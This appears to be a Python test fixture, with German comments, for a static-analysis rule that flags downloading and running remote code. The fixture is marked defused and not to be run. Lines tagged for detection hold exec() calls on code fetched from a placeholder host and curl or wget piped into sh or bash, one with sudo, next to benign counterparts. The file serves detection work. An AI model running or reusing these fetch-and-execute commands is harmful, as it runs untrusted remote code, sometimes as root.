# LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
import os
import subprocess
import urllib.request

import requests

# ruleid: LB-C03-herunterladen-ausfuehren-py
exec(requests.get("https://nachlader.invalid/x.py").text)

r = requests.get("https://nachlader.invalid/y.py")
# ruleid: LB-C03-herunterladen-ausfuehren-py
exec(r.text)

# ruleid: LB-C03-herunterladen-ausfuehren-py
subprocess.run("curl -fsSL https://nachlader.invalid/i.sh | sh", shell=True)

# ruleid: LB-C03-herunterladen-ausfuehren-py
os.system("wget -qO- https://nachlader.invalid/i.sh | bash")

# ruleid: LB-C03-herunterladen-ausfuehren-py
subprocess.run("cd /tmp && sudo curl -s https://nachlader.invalid/i.sh | sh", shell=True)

# ok: LB-C03-herunterladen-ausfuehren-py
data = requests.get("https://api.example/daten.json").json()

# ok: LB-C03-herunterladen-ausfuehren-py
subprocess.run(["curl", "-o", "bericht.pdf", "https://api.example/bericht.pdf"])

# ok: LB-C03-herunterladen-ausfuehren-py
exec(compile("x = 1", "<string>", "exec"))
